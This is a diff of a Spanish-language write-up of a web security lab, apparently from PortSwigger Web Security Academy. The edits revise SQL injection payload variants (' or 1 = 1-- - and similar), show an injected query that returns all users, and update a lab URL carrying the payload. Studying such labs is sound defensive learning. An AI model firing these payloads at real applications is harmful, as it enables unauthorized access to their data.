@@ -44,12 +44,12 @@ select id,username from users where subscription = '1' and id = 5;
 
 ### Resultado final
 
-- Con el payload `or 1 = 1-- -'` o `or 1 = 1'-- -` _(o alguna de sus variantes de comentarios)_ es como "romperé" el query:
+- Con el payload `' or 1 = 1;-- -` o `' or 1 = 1-- -'` o `' or 1 = 1'-- -` _(o alguna de sus variantes de comentarios)_ es como "romperé" el query:
 - Es decir, con este payload le estoy pidiendo en la query que regrese el `id=5` (osea solo `Ff0ur`) o todo donde sea `1=1` (osea `true`)... osea todo!!! porque todo es true!!!!!! muahaha!! ;)
 
 ````sql
 # Ejemplo Final: (ya con SQLi)
-select id,username from users where subscription = '1' or 1 = 1;-- -' and id = 5 (aqui incluso puede ir otro query original que elimino, ya que es un comentario!!! :P);
+select id,username from users where subscription = '1' or 1 = 1;-- - and id = 5 (aqui incluso puede ir otro query original que elimino, ya que es un comentario!!! :P);
 ````
 ````py
 # Arroja todos los usernames y ids, sin condicionales!!
@@ -83,10 +83,11 @@ select id,username from users where subscription = '1' or 1 = 1;-- -' and id = 5
 'or 1=1-- -
 ````
 ````http
-https://0adf002604af55028177ed87004400b4.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
+https://0a83007b03adf85d811702c2004f0064.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
 ````
 
-![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/22e3492e-a7c7-4573-a966-73830aa681fe)
+![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/2d654adb-8e7f-41eb-b8fc-84c9935c3e83)
+
 
 
 
